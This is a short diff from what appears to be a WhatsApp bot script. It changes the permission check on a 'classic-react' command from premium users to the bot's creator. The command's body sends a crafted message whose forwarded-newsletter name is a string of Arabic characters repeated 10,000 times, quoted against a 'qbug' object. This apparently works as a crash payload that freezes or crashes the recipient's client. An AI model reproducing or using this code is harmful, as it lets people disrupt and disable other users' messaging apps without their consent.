@@ -2901,7 +2901,7 @@ zetsubo.sendMessage(m.chat, { text: `★彡 𝑺𝑼𝑹𝑷𝑹𝑰𝑺𝑬𝑫
 break
   //=================================================
 case 'classic-react': {
-if (!isPremium) return reply(mess.premium)
+if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
 if (!m.quoted) return reply(`Penggunaan .${command} reply pesan`)
 await zetsubo.sendMessage(m.chat, { text: 'success 💀', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: '؂ن؃؄ٽ؂ن؃؄ٽ'.repeat(10000), serverMessageId: 2 } }}, { quoted: qbug })
 await sleep(20000)
